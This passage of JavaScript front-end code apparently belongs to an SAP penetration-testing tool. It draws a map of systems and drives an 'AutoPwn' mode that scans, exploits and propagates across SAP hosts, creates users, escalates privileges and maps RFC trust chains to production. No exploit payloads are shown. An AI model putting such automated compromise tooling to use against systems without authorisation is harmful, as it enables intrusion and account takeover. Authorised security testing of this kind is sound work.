  const x = parseFloat(rect.getAttribute('x')) - 6;
  const y = parseFloat(rect.getAttribute('y')) - 6;
  const w = parseFloat(rect.getAttribute('width')) + 12;
  const h = parseFloat(rect.getAttribute('height')) + 12;
  // Two overlaid layers so the operator can't miss it:
  //   * a soft amber fill flash that breathes 0.25 → 0.02 → 0.25
  //   * a thick bright outer ring that pulses opacity + width
  // Animation cycle is short (1.3s) and repeats indefinitely; the
  // expiry timer below controls when the overlays are removed.
  const fill = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
  fill.setAttribute('class', 'attack-hl-overlay');
  fill.setAttribute('x', x);
  fill.setAttribute('y', y);
  fill.setAttribute('width', w);
  fill.setAttribute('height', h);
  fill.setAttribute('rx', '10');
  fill.setAttribute('fill', '#ff8c00');
  fill.setAttribute('stroke', 'none');
  fill.setAttribute('opacity', '0.18');
  fill.setAttribute('pointer-events', 'none');
  fill.innerHTML = '<animate attributeName="opacity" values="0.25;0.02;0.25" dur="1.3s" repeatCount="indefinite" />';
  el.appendChild(fill);

  const ring = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
  ring.setAttribute('class', 'attack-hl-overlay');
  ring.setAttribute('x', x);
  ring.setAttribute('y', y);
  ring.setAttribute('width', w);
  ring.setAttribute('height', h);
  ring.setAttribute('rx', '10');
  ring.setAttribute('fill', 'none');
  ring.setAttribute('stroke', '#ff8c00');
  ring.setAttribute('stroke-width', '5');
  ring.setAttribute('pointer-events', 'none');
  ring.innerHTML =
    '<animate attributeName="stroke-opacity" values="1;0.35;1" dur="1.3s" repeatCount="indefinite" />'
  + '<animate attributeName="stroke-width" values="5;8;5" dur="1.3s" repeatCount="indefinite" />';
  el.appendChild(ring);
}

function _reapplyAttackHighlights() {
  if (!_attackHighlight.sids || !_attackHighlight.sids.size) return;
  if (Date.now() > _attackHighlight.expiresAt) {
    _clearAttackHighlights();
    return;
  }
  document.querySelectorAll('g.node-box[data-sid]').forEach(el => {
    if (_attackHighlight.sids.has(el.getAttribute('data-sid'))) {
      _attachAttackHighlight(el);
    }
  });
}

function _clearAttackHighlights() {
  _attackHighlight = { sids: new Set(), expiresAt: 0 };
  document.querySelectorAll('rect.attack-hl-overlay').forEach(e => {
    try { e.remove(); } catch (_) {}
  });
}

function filterMapToSids(sids) {
  // Highlight matching nodes with a pulsing orange outline so the
  // operator can immediately see which systems a technique was
  // observed on.  The overlay is re-applied after every updateMap()
  // call (via _reapplyAttackHighlights at the end of updateMap),
  // because the SVG rewrite during a poll wipes the overlay we
  // attached.  HIGHLIGHT_DURATION_MS governs how long the pulse
  // stays visible regardless of how many polls happen meanwhile.
  const sidArr = Array.isArray(sids) ? sids : [];
  _attackHighlight = {
    sids: new Set(sidArr),
    expiresAt: Date.now() + HIGHLIGHT_DURATION_MS,
  };

  // Apply immediately so the first cycle of the pulse starts before
  // the next updateMap() tick.
  let highlighted = 0;
  document.querySelectorAll('g.node-box[data-sid]').forEach(el => {
    if (!_attackHighlight.sids.has(el.getAttribute('data-sid'))) return;
    highlighted++;
    _attachAttackHighlight(el);
    try {
      const rect = el.querySelector('rect');
      if (rect) rect.scrollIntoView({behavior: 'smooth', block: 'center', inline: 'center'});
    } catch (_) {}
  });

  // Expire the highlight after the wall-clock window so a long-idle
  // map doesn't pulse forever waiting for the next render tick.
  setTimeout(() => {
    if (Date.now() >= _attackHighlight.expiresAt) _clearAttackHighlights();
  }, HIGHLIGHT_DURATION_MS + 200);

  if (highlighted) {
    showToast('Highlighted ' + highlighted + ' node(s): ' + sidArr.join(', '),
              'info', {autoCloseMs: HIGHLIGHT_DURATION_MS});
  }
}

async function downloadAttackNavigatorLayer() {
  // pywebview renders application/json responses inline regardless of
  // Content-Disposition: attachment, so the natural anchor-download trick
  // shows the JSON inside the SAPMAP window instead of saving it.
  // Server-side write keeps the UX consistent across pywebview AND real
  // browsers: the file always lands in loot/reports/ and we tell the
  // operator the exact path so they can drag it into Navigator.
  try {
    const r = await fetch('/api/attack/save_navigator_layer', {method: 'POST'});
    const d = await r.json();
    if (d.status === 'ok') {
      showToast(
        'Navigator layer saved (' + (d.techniques || 0) + ' technique' +
        ((d.techniques === 1) ? '' : 's') + '):  ' + d.path,
        'info', {autoCloseMs: 12000});
    } else {
      showToast('Save failed: ' + (d.error || '?'), 'error');
    }
  } catch (e) {
    showToast('Save failed: ' + e, 'error');
  }
}

// =========================================================================
// AutoPwn — config modal, launch, progress polling, phase tracker
// =========================================================================
let _apwnPollTimer = null;

function showAutoPwnModal() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  document.getElementById('autopwn-config-modal').classList.add('visible');
}

async function launchAutoPwn() {
  closeModal('autopwn-config-modal');

  const cfg = {
    max_waves:   parseInt(document.getElementById('apwn-max-waves').value, 10),
    scan_gw:     document.getElementById('apwn-scan-gw').checked,
    scan_10kblaze: document.getElementById('apwn-scan-10k').checked,
    scan_cve_31324: document.getElementById('apwn-scan-31324').checked,
    scan_recon:  document.getElementById('apwn-scan-recon').checked,
    try_dpmon_sap_star: document.getElementById('apwn-dpmon-sapstar').checked,
    include_lpe: document.getElementById('apwn-lpe').checked,
    include_btp: document.getElementById('apwn-btp').checked,
    include_icmad_detection: document.getElementById('apwn-det-icmad').checked,
    include_router_info_detection: document.getElementById('apwn-det-router').checked,
  };

  // Reset progress UI
  document.getElementById('apwn-log').innerHTML = '';
  document.getElementById('apwn-bar').style.width = '0%';
  document.getElementById('apwn-pct').textContent = '0%';
  document.getElementById('apwn-stop-btn').style.display = '';
  document.getElementById('apwn-stop-btn').disabled = false;
  document.getElementById('apwn-stop-btn').textContent = '◼ STOP';
  document.getElementById('apwn-close-btn').style.display = 'none';
  document.getElementById('apwn-wave-label').textContent = 'Starting...';
  ['scan','exploit','enrich','propagate','btp','lpe'].forEach(p => {
    const el = document.getElementById('apwn-ph-' + p);
    el.className = 'autopwn-phase';
    el.querySelector('.autopwn-phase-sub').textContent = '';
  });
  // Mark optional phases as skipped if not selected
  if (!cfg.include_btp) document.getElementById('apwn-ph-btp').classList.add('skipped');
  if (!cfg.include_lpe) document.getElementById('apwn-ph-lpe').classList.add('skipped');
  ['scanned','vulnerable','pwned','users'].forEach(k =>
    document.getElementById('apwn-st-' + k).textContent = '0');

  // Show progress panel (docked right — map stays visible)
  document.getElementById('autopwn-progress-panel').classList.add('visible');

  // Fire the backend
  await api('POST', 'actions/autopwn', cfg);
  startPolling();

  // Start dedicated AutoPwn status polling
  _apwnLastLogCursor = 0;
  _apwnPollAutoPwnStatus();
}

let _apwnLastLogCursor = 0;

async function _apwnPollAutoPwnStatus() {
  try {
    const resp = await fetch('/api/actions/autopwn/status');
    const st = await resp.json();

    // Wave label
    if (st.running) {
      document.getElementById('apwn-wave-label').textContent =
        `Wave ${st.wave} / ${st.max_waves}`;
    }

    // Phase tracker
    const phaseOrder = ['scan','exploit','enrich','propagate','btp','lpe','detect','done'];
    const currentIdx = phaseOrder.indexOf(st.phase);
    const phaseMap = {scan:'scan', exploit:'exploit', enrich:'enrich',
                      propagate:'propagate', btp:'btp', lpe:'lpe'};
    for (const [key, elId] of Object.entries(phaseMap)) {
      const el = document.getElementById('apwn-ph-' + elId);
      if (!el) continue;
      const pIdx = phaseOrder.indexOf(key);
      if (el.classList.contains('skipped')) continue;
      el.classList.remove('active', 'done');
      if (pIdx < currentIdx) el.classList.add('done');
      else if (pIdx === currentIdx) el.classList.add('active');
    }

    // Phase sub-progress
    if (st.phase_progress && st.phase_progress[1] > 0) {
      const subEl = document.getElementById('apwn-ph-' + (phaseMap[st.phase] || '') + '-sub');
      if (subEl) subEl.textContent = `${st.phase_progress[0]}/${st.phase_progress[1]}`;
    }

    // Stats
    const s = st.stats || {};
    document.getElementById('apwn-st-scanned').textContent = s.scanned || 0;
    document.getElementById('apwn-st-vulnerable').textContent = s.vulnerable || 0;
    document.getElementById('apwn-st-pwned').textContent = s.pwned || 0;
    document.getElementById('apwn-st-users').textContent = s.users_created || 0;

    // Progress bar (pwned / total)
    const total = s.total || 1;
    const pwned = s.pwned || 0;
    const pct = Math.min(100, Math.round(100 * pwned / total));
    document.getElementById('apwn-bar').style.width = pct + '%';
    document.getElementById('apwn-pct').textContent = pct + '%';

    // Finished?
    if (st.finished || !st.running) {
      document.getElementById('apwn-wave-label').textContent =
        st.error ? 'AutoPwn Error' : 'AutoPwn Complete';
      document.getElementById('apwn-stop-btn').style.display = 'none';
      document.getElementById('apwn-close-btn').style.display = '';
      // Mark all non-skipped phases as done
      for (const elId of Object.values(phaseMap)) {
        const el = document.getElementById('apwn-ph-' + elId);
        if (el && !el.classList.contains('skipped')) {
          el.classList.remove('active');
          el.classList.add('done');
        }
      }
      return; // stop polling
    }
  } catch (e) {
    // ignore fetch errors, retry on next tick
  }

  // Also pull console lines into the log pane
  try {
    const cr = await fetch('/api/console?cursor=' + _apwnLastLogCursor);
    const cdata = await cr.json();
    if (cdata.lines && cdata.lines.length > 0) {
      const logEl = document.getElementById('apwn-log');
      for (const ln of cdata.lines) {
        const div = document.createElement('div');
        const text = ln.text || '';
        // Detect wave headers
        if (text.indexOf('WAVE ') !== -1 && text.indexOf('====') !== -1) {
          div.className = 'wave-hdr';
        } else if (text.indexOf('PHASE ') !== -1 || text.indexOf('Phase ') !== -1) {
          div.className = 'phase-hdr';
        } else {
          div.className = ln.cls || 'cl-info';
        }
        // Timestamp prefix
        const ts = ln.ts || '';
        div.textContent = (ts ? '[' + ts + '] ' : '') + text;
        logEl.appendChild(div);
      }
      _apwnLastLogCursor = cdata.cursor || _apwnLastLogCursor;
      // Auto-scroll to bottom
      logEl.scrollTop = logEl.scrollHeight;
    }
  } catch (e) { /* ignore */ }

  _apwnPollTimer = setTimeout(_apwnPollAutoPwnStatus, 800);
}

async function stopAutoPwn() {
  await api('POST', 'scan/stop');
  document.getElementById('apwn-stop-btn').textContent = 'Stopping...';
  document.getElementById('apwn-stop-btn').disabled = true;
}

function closeAutoPwnPanel() {
  document.getElementById('autopwn-progress-panel').classList.remove('visible');
  if (_apwnPollTimer) { clearTimeout(_apwnPollTimer); _apwnPollTimer = null; }
}

async function analyzeChains() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 2) { alert('Need at least 2 systems on the map with RFC connections.'); return; }
  await api('POST', 'actions/analyze_chains');
  // Poll for results then show them
  setTimeout(async () => {
    const r = await fetch('/api/chains');
    const data = await r.json();
    const chains = data.chains || [];
    if (chains.length === 0) {
      // Keep polling a bit
      setTimeout(async () => {
        const r2 = await fetch('/api/chains');
        const d2 = await r2.json();
        showChainResults(d2.chains || []);
      }, 3000);
    } else {
      showChainResults(chains);
    }
  }, 2000);
  startPolling();
}

function showChainResults(chains) {
  const panel = document.getElementById('detail-panel');
  // Mark this view distinct from details/scc/btp/dbcon so the
  // state-poll auto-refresh doesn't immediately clobber the chain
  // results with a re-render of whatever SAP node was last opened.
  // Also drop any stale dataset.sid so the poll's diff checks skip.
  panel.setAttribute('data-view', 'chains');
  panel.dataset.sid = 'chains';
  const sevColors = { 5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6' };

  if (chains.length === 0) {
    panel.innerHTML = `
      <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
      <h3>&#128279; Trust Chain Analysis</h3>
      <div style="color:#8b949e;padding:12px">
        No exploitable attack chains found.<br><br>
        This means either:<br>
        &bull; No systems are compromised/exploitable yet<br>
        &bull; RFC connections haven't been retrieved<br>
        &bull; No RFC links have successful logon with SAP_ALL<br><br>
        Try: Retrieve RFC connections first, then run the analysis.
      </div>`;
    panel.classList.add('visible');
    return;
  }

  const prodChains = chains.filter(c => c.end_is_production);

  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>&#128279; Trust Chain Analysis (${chains.length} paths${prodChains.length ? ', ' + prodChains.length + ' reach production' : ''})</h3>
    ${chains.map((c, idx) => {
      const col = sevColors[c.severity] || '#95a5a6';
      const pathSids = c.path_sids || [];
      const arrow = ' &#8594; ';

      return '<div class="detail-section" style="border-left:3px solid ' + col + ';padding-left:10px;margin-bottom:14px;cursor:pointer" ' +
        "onclick='highlightChain(" + JSON.stringify(pathSids) + ")'>" +
        '<div style="display:flex;justify-content:space-between;align-items:center">' +
          '<h4 style="margin:0;font-size:13px">&#128279; ' + escHtml(c.headline) + '</h4>' +
          '<span style="font-size:10px;padding:2px 6px;border-radius:3px;background:' + col + ';color:#fff;font-weight:bold">' + escHtml(c.risk_label) + '</span>' +
        '</div>' +
        '<div style="margin:6px 0;font-size:12px">' +
          '<span style="font-family:monospace;background:#21262d;padding:3px 8px;border-radius:4px;display:inline-block">' +
            pathSids.map((s,i) => '<span style="color:' + (i === 0 ? '#f0883e' : i === pathSids.length-1 ? (c.end_is_production ? '#e74c3c' : '#58a6ff') : '#c9d1d9') + '">' + escHtml(s) + '</span>').join(arrow) +
          '</span>' +
        '</div>' +
        (c.hops || []).map((h, hi) =>
          '<div style="font-size:11px;color:#8b949e;margin:2px 0;padding-left:' + (hi * 8 + 4) + 'px">' +
            '&#9654; ' + escHtml(h.source_sid) + ' &#8594; ' + escHtml(h.target_sid) +
            (h.destination_name ? ' via <span style="color:#58a6ff">' + escHtml(h.destination_name) + '</span>' : '') +
            (h.rfc_user ? ' (user: ' + escHtml(h.rfc_user) + ')' : '') +
            (h.has_sap_all ? ' <span style="color:#e74c3c;font-weight:bold">SAP_ALL</span>' : '') +
          '</div>'
        ).join('') +
        '<div style="font-size:11px;color:#8b949e;margin-top:4px">' +
          'Entry: ' + escHtml(c.entry_method || 'unknown') +
          (c.end_is_production ? ' &mdash; <span style="color:#e74c3c;font-weight:bold">PRODUCTION reached</span>' : '') +
        '</div>' +
        (c.business_impact ? '<div style="font-size:12px;color:#c9d1d9;margin-top:4px;font-style:italic">&ldquo;' + escHtml(c.business_impact) + '&rdquo;</div>' : '') +
        '<div style="font-size:10px;color:#58a6ff;margin-top:4px">Click to highlight on map</div>' +
      '</div>';
    }).join('')}
  `;
  panel.classList.add('visible');
}

let _highlightedChain = null;
function highlightChain(pathSids) {
  _highlightedChain = pathSids;
  updateMap();
  // Auto-clear after 15 seconds
  setTimeout(() => { _highlightedChain = null; updateMap(); }, 15000);
}

async function testAllRFCs() {
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];
  const sources = Object.keys(nodes).filter(sid => {
    const n = nodes[sid];
    const hasCreds = ((n.credentials || []).length > 0)
                     || ((n.created_users || []).length > 0)
                     || n.pwned;
    const hasRFCs = conns.some(c => c.source_sid === sid);
    return hasCreds && hasRFCs;
  });
  if (sources.length === 0) {
    alert('No systems on the map have both credentials and RFC destinations to test.');
    return;
  }
  if (!confirm('Test RFC destinations on ' + sources.length + ' system(s): '
               + sources.join(', ') + '?\n\n'
               + '⚠ Warning: if a destination holds a wrong password for a '
               + 'real user, this may lock that user on the target system.')) return;
  for (const sid of sources) {
    await api('POST', `node/${sid}/test_rfcs`);
  }
}
async function showCreatedUsers() {
  const res = await api('GET', 'actions/created_users');
  const users = res.users || [];
  alert(users.length === 0 ? 'No users created yet.' :
    users.map(u => `${u.username} @ ${u.sid} (${u.method})`).join('\n'));
}

async function showCreatedDestinations() {
  const res = await api('GET', 'actions/created_destinations');
  const dests = res.destinations || [];
  if (dests.length === 0) { alert('No TCP/IP destinations created yet.'); return; }
  const lines = dests.map(d => {
    const ts = d.created_at ? d.created_at.replace('T', ' ').substring(0, 19) : '?';
    return `${d.dest_name}  on ${d.source_sid} → ${d.target_sid} (${d.target_host}:${d.gw_port})  [${ts}]`;
  });
  alert(`Created TCP/IP Destinations (${dests.length}):\n\n` + lines.join('\n'));
}

async function clearCreatedDestinations() {
  if (confirm('Clear the list of created TCP/IP destinations? This only clears the tracking list, not the actual destinations on the SAP systems.'))
    await api('POST', 'actions/clear_created_destinations');
}

// --- Save/Load ---
async function saveState() {
  const d = new Date();
  const ts = d.getFullYear() + ('0'+(d.getMonth()+1)).slice(-2) + ('0'+d.getDate()).slice(-2) + '_' + ('0'+d.getHours()).slice(-2) + ('0'+d.getMinutes()).slice(-2) + ('0'+d.getSeconds()).slice(-2);
  const name = prompt('Save state as:', 'sapmap_' + ts);
  if (!name) return;
  await api('POST', 'state/save', { name });
}
function loadState() {
  document.getElementById('file-picker').click();
}
function handleFileLoad(input) {
  const file = input.files[0];
  if (!file) return;
  input.value = '';
  const reader = new FileReader();
  reader.onload = async function(e) {
    try {
      const data = JSON.parse(e.target.result);
      const res = await api('POST', 'state/upload', data);
      if (res.error) alert('Load failed: ' + res.error);
      // Reset cursors + dismissal state so the restored findings snapshot
      // reappears in the banner/drawer/bell on the next poll.
      findingsCursor = 0;
      _activeFindings = [];
      _dismissedFindingIds = new Set();
      _bannerHiddenIds = new Set();
      renderFindings();
    } catch (err) {
      alert('Invalid file: ' + err.message);
    }
    startPolling();
  };
  reader.readAsText(file);
}
async function exportJSON() {
  window.open('/api/export/json', '_blank');
}

async function exportReport() {
  // Engagement-style Markdown report.  We do NOT trigger a browser
  // download — pywebview's embedded Chromium navigates the main
  // window away when handed a blob/data response, replacing the map
  // with the raw report content.  The endpoint writes the file
  // server-side and returns JSON with the path, which we surface in
  // a toast so the operator can open it externally.
  showToast(
    '<strong>📝 Generating engagement report…</strong>'
      + '<div style="color:#8b949e;font-size:11px;margin-top:4px">'
      + 'Walking landscape state — saving to loot/reports/</div>',
    {autoCloseMs: 4000}
  );
  try {
    const r = await fetch('/api/export/report');
    const j = await r.json();
    if (!j.ok) {
      showToast('Report export failed: ' + (j.error || 'unknown'),
                {autoCloseMs: 8000});
      return;
    }
    showToast(
      '<strong style="color:#3fb950">📝 Engagement reports saved</strong>'
        + '<div style="color:#c9d1d9;font-size:11px;margin-top:6px;'
        + 'font-family:monospace;word-break:break-all">'
        + '<b>HTML</b> (presentable):<br>' + escHtml(j.html_path) + '</div>'
        + '<div style="color:#c9d1d9;font-size:11px;margin-top:6px;'
        + 'font-family:monospace;word-break:break-all">'
        + '<b>Markdown</b> (raw):<br>' + escHtml(j.md_path) + '</div>'
        + '<div style="color:#8b949e;font-size:10px;margin-top:6px">'
        + 'Open the HTML file in any browser → looks great, prints to PDF.</div>',
      {autoCloseMs: 18000}
    );
    console.log('[*] Reports saved: ' + j.html_path + ' + ' + j.md_path);
  } catch (e) {
    showToast('Report export error: ' + e, {autoCloseMs: 8000});
    console.error('[exportReport]', e);
  }
}

// --- View controls ---
function zoomIn() { viewBoxUserControlled = true; viewBox.w *= 0.8; viewBox.h *= 0.8; applyViewBox(); }
function zoomOut() { viewBoxUserControlled = true; viewBox.w *= 1.25; viewBox.h *= 1.25; applyViewBox(); }
function fitMap() { viewBoxUserControlled = false; viewBox.x = 0; viewBox.y = 0; viewBox.w = 1200; viewBox.h = 800; viewBox._nodeCount = 0; applyViewBox(); updateMap(); }
function _hasSccOnSameHost(n) {
  // Returns true when an SCCNode shares the same IP as SAP node n.
  if (!n) return false;
  const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;
  const nip = (n.ip && IP_RE.test(n.ip)) ? n.ip :
              (n.hostname && IP_RE.test(n.hostname||'')) ? n.hostname : '';
  if (!nip) return false;
  return Object.values(mapState.scc_nodes || {}).some(sn => {
    const snip = (sn.ip && IP_RE.test(sn.ip)) ? sn.ip :
                 (sn.host && IP_RE.test(sn.host||'')) ? sn.host : '';
    return snip === nip;
  });
}

function _sccHostForNode(n) {
  // Returns the host key of the SCCNode on the same IP as SAP node n.
  if (!n) return null;
  const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;
  const nip = (n.ip && IP_RE.test(n.ip)) ? n.ip :
              (n.hostname && IP_RE.test(n.hostname||'')) ? n.hostname : '';
  if (!nip) return null;
  for (const [host, sn] of Object.entries(mapState.scc_nodes || {})) {
    const snip = (sn.ip && IP_RE.test(sn.ip)) ? sn.ip :
                 (sn.host && IP_RE.test(sn.host||'')) ? sn.host : '';
    if (snip === nip) return host;
  }
  return null;
}
function resetLayout() {
  flashActivity('Rearranging: Reset');
  viewBoxUserControlled = false;
  viewBox.x = 0; viewBox.y = 0; viewBox._nodeCount = 0;
  Object.values(mapState.nodes || {}).forEach(n => { n._x = null; n._y = null; });
  Object.values(mapState.scc_nodes || {}).forEach(sn => { sn._x = null; sn._y = null; });
  Object.values(mapState.btp_subaccounts || {}).forEach(bn => { bn._x = null; bn._y = null; });
  updateMap();
}

// ---------------------------------------------------------------------------
// Alternative layouts.  All operate on mapState.nodes by setting
// n._x / n._y (top-left corner of each node box) and then trigger
// fitMap() so the new layout fills the viewport.  Box dimensions
// duplicated from updateMap()'s constants — keep in sync.
// ---------------------------------------------------------------------------
const _LO_BOX_W = 240, _LO_BOX_H = 174, _LO_MARGIN = 60;

function _loCenter(n, cx, cy) {
  // Place node so its CENTER lands at (cx, cy).
  n._x = cx - _LO_BOX_W / 2;
  n._y = cy - _LO_BOX_H / 2;
}

function _loSortedNodeKeys() {
  const nodes = mapState.nodes || {};
  return Object.keys(nodes).sort();
}

// Place BTP subaccount nodes in a horizontal strip starting at
// (xStart, yStart) and return the vertical space they consumed
// (0 when there are none).  Every alternative layout calls this
// first so the cloud tier never collides with on-prem clusters.
function _loPlaceBtpTier(xStart, yStart) {
  const btp = mapState.btp_subaccounts || {};
  const uuids = Object.keys(btp).sort();
  if (!uuids.length) return 0;
  uuids.forEach((u, i) => {
    const obj = btp[u];
    if (!obj) return;
    obj._x = xStart + i * (_LO_BOX_W + _LO_MARGIN);
    obj._y = yStart;
  });
  return _LO_BOX_H + _LO_MARGIN * 2;
}

function layoutCircle() {
  const sids = _loSortedNodeKeys();
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  // BTP subaccounts join the ring alongside on-prem nodes.  Operator
  // report (2026-07-12): previously the BTP nodes were dropped into
  // a separate "tier" strip above the circle — which made sense on
  // hierarchical layouts but on CIRCLE looked like the BTP node was
  // orphaned in a corner, disconnected from every edge terminating
  // on the ring.  For a circular topology the whole point is "one
  // ring with everything on it"; the cloud tier belongs to the
  // hierarchical / grid layouts, not this one.
  const btpUuids = Object.keys(mapState.btp_subaccounts || {}).sort();
  const allItems = [
    ...btpUuids.map(u => ({ id: u, obj: (mapState.btp_subaccounts||{})[u] })),
    ...sids.map(id => ({ id, obj: (mapState.nodes||{})[id] })),
    ...sccHosts.map(h => ({ id: h, obj: (mapState.scc_nodes||{})[h] })),
  ].filter(x => x.obj);
  if (allItems.length === 0) return;
  flashActivity('Rearranging: Circle');
  // Radius scales with total node count so boxes never overlap on the ring.
  const total = allItems.length;
  const circ = total * (_LO_BOX_W + _LO_MARGIN);
  const r = Math.max(360, circ / (2 * Math.PI));
  const cx = r + _LO_BOX_W;
  const cy = r + _LO_BOX_H + _LO_MARGIN;
  allItems.forEach(({obj}, i) => {
    const angle = (2 * Math.PI * i) / total - Math.PI / 2;
    _loCenter(obj, cx + r * Math.cos(angle), cy + r * Math.sin(angle));
  });
  fitMap();
  updateMap();
}

function layoutStar() {
  // Hub-and-spoke: most-connected SAP node at centre, everything else on ring.
  const sids = _loSortedNodeKeys();
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  if (sids.length === 0 && sccHosts.length === 0) return;
  flashActivity('Rearranging: Star');
  const nodes = mapState.nodes || {};
  const conns = mapState.connections || [];
  const deg = {};
  sids.forEach(s => { deg[s] = 0; });
  conns.forEach(c => {
    if (deg[c.source_sid] != null) deg[c.source_sid]++;
    if (deg[c.target_sid] != null) deg[c.target_sid]++;
  });
  let hub = sids[0];
  sids.forEach(s => {
    if (!hub || deg[s] > deg[hub] || (deg[s] === deg[hub] && s < hub)) hub = s;
  });
  // BTP subaccounts join the spokes too — same rationale as
  // layoutCircle: cloud nodes make sense as ring members on a
  // star topology, not as an orphaned tier strip.
  const btpUuids = Object.keys(mapState.btp_subaccounts || {}).sort();
  const spokes = [
    ...btpUuids.map(u => ({ obj: (mapState.btp_subaccounts||{})[u] })),
    ...sids.filter(s => s !== hub).map(id => ({ obj: nodes[id] })),
    ...sccHosts.map(h => ({ obj: (mapState.scc_nodes||{})[h] })),
  ].filter(x => x.obj);
  const r = Math.max(360, spokes.length * (_LO_BOX_W + _LO_MARGIN) / (2 * Math.PI));
  const cx = r + _LO_BOX_W;
  const cy = r + _LO_BOX_H + _LO_MARGIN;
  if (hub) _loCenter(nodes[hub], cx, cy);
  spokes.forEach(({obj}, i) => {
    const angle = (2 * Math.PI * i) / spokes.length - Math.PI / 2;
    _loCenter(obj, cx + r * Math.cos(angle), cy + r * Math.sin(angle));
  });
  fitMap();
  updateMap();
}

function layoutHierarchy() {
  // Layered top-down by RFC edge direction.  Sources of edges go on
  // upper layers, targets below.  Uses a BFS pass: nodes with no
  // incoming edges land on layer 0; everyone else gets max(layer of
  // any source) + 1.  Cycles are broken by the BFS order so the
  // result is always a valid layered DAG even on cyclic landscapes.
  const sids = _loSortedNodeKeys();
  if (sids.length === 0) return;
  flashActivity('Rearranging: Hierarchy');
  const nodes = mapState.nodes;
  const conns = mapState.connections || [];
  // Build incoming edge map (target -> [source])
  const incoming = {};
  sids.forEach(s => { incoming[s] = new Set(); });
  conns.forEach(c => {
    if (c.source_sid && c.target_sid && c.source_sid !== c.target_sid
        && incoming[c.target_sid] != null) {
      incoming[c.target_sid].add(c.source_sid);
    }
  });
  // Iteratively assign layer = max(layer(src)+1).  Cap at 12 passes
  // so cycles don't loop forever.
  const layer = {};
  sids.forEach(s => { layer[s] = 0; });
  for (let pass = 0; pass < 12; pass++) {
    let changed = false;
    sids.forEach(s => {
      let max_src = -1;
      incoming[s].forEach(src => {
        if (layer[src] > max_src) max_src = layer[src];
      });
      if (max_src + 1 > layer[s] && max_src >= 0) {
        layer[s] = max_src + 1;
        changed = true;
      }
    });
    if (!changed) break;
  }
  // Bucket sids by layer
  const buckets = {};
  sids.forEach(s => {
    (buckets[layer[s]] = buckets[layer[s]] || []).push(s);
  });
  const layerKeys = Object.keys(buckets).map(Number).sort((a,b)=>a-b);
  // Place each layer as a horizontal row, centred on x.
  const ySpacing = _LO_BOX_H + _LO_MARGIN * 1.5;
  const xSpacing = _LO_BOX_W + _LO_MARGIN;
  const maxRow = Math.max(...layerKeys.map(k => buckets[k].length));
  const rowWidth = maxRow * xSpacing;
  // BTP cloud tier sits above the on-prem hierarchy.
  const btpTier = _loPlaceBtpTier(_LO_MARGIN, _LO_MARGIN);

  // ── SCC pre-pass: which RFC layers need a sub-row of SCCs? ───────────
  // The previous "place SCC to the right of its SAP sibling" approach
  // collides when several host groups share an RFC layer (e.g. RD1/S4D/
  // S4H + TWT all on layer 0 because none has an incoming RFC edge):
  // SCC-of-209 lands exactly where TWT was placed.  Drop colocated SCCs
  // into a SUB-ROW below their host's SAP layer, centred horizontally on
  // the SAP group, so each host stays in its own column block.
  const sccHosts = Object.keys(mapState.scc_nodes || {}).sort();
  const IP_RE_HIER = /^\d{1,3}(\.\d{1,3}){3}$/;
  const getNodeIP = n => {
    if (n.ip && IP_RE_HIER.test(n.ip)) return n.ip;
    if (n.hostname && IP_RE_HIER.test(n.hostname)) return n.hostname;
    if (n.host && IP_RE_HIER.test(n.host)) return n.host;
    return null;
  };
  const colocatedByIp = {};
  const standaloneSccs = [];
  sccHosts.forEach(h => {
    const sn = (mapState.scc_nodes || {})[h];
    const ip = getNodeIP(sn);
    if (!ip) { standaloneSccs.push(h); return; }
    const hasSibling = sids.some(sid => getNodeIP(nodes[sid]) === ip);
    if (!hasSibling) { standaloneSccs.push(h); return; }
    (colocatedByIp[ip] = colocatedByIp[ip] || []).push(h);
  });
  const layerHasScc = new Set();
  Object.keys(colocatedByIp).forEach(ip => {
    const firstSibling = sids.find(sid => getNodeIP(nodes[sid]) === ip);
    if (firstSibling != null) layerHasScc.add(layer[firstSibling]);
  });
  // Per-layer extra Y offset: each preceding layer that owns a SCC sub-row
  // pushes subsequent SAP layers one ySpacing further down.
  const extraOffsetByLayer = {};
  let _accY = 0;
  layerKeys.forEach(lk => {
    extraOffsetByLayer[lk] = _accY;
    if (layerHasScc.has(lk)) _accY += ySpacing;
  });

  // Place SAP rows with the reserved sub-row offset.
  layerKeys.forEach((lk, layerIdx) => {
    const row = buckets[lk].sort();
    const yC = _LO_MARGIN + btpTier
                + layerIdx * ySpacing
                + extraOffsetByLayer[lk]
                + _LO_BOX_H / 2;
    const xPad = (rowWidth - row.length * xSpacing) / 2;
    row.forEach((sid, i) => {
      const xC = _LO_MARGIN + xPad + i * xSpacing + _LO_BOX_W / 2;
      _loCenter(nodes[sid], xC, yC);
    });
  });

  // Place colocated SCCs in the sub-row of their SAP layer, centred
  // horizontally on the host's SAP group.  This guarantees no collision
  // with another host's SAP nodes in the same layer because the SCC's Y
  // is below that layer (reservation above) and the SCC's X stays
  // anchored to its own SAP siblings.
  Object.entries(colocatedByIp).forEach(([ip, sccList]) => {
    const siblings = sids.filter(sid => getNodeIP(nodes[sid]) === ip);
    if (!siblings.length) {
      sccList.forEach(h => standaloneSccs.push(h));
      return;
    }
    const sapLayer = layer[siblings[0]];
    const sapLayerIdx = layerKeys.indexOf(sapLayer);
    const sapYC = _LO_MARGIN + btpTier
                   + sapLayerIdx * ySpacing
                   + extraOffsetByLayer[sapLayer]
                   + _LO_BOX_H / 2;
    const sccYC = sapYC + ySpacing;       // sub-row directly below SAP layer

    let minX = Infinity, maxX = -Infinity;
    siblings.forEach(sid => {
      const n = nodes[sid];
      if (n._x != null) {
        minX = Math.min(minX, n._x);
        maxX = Math.max(maxX, n._x + _LO_BOX_W);
      }
    });
    if (minX === Infinity) {
      sccList.forEach(h => standaloneSccs.push(h));
      return;
    }
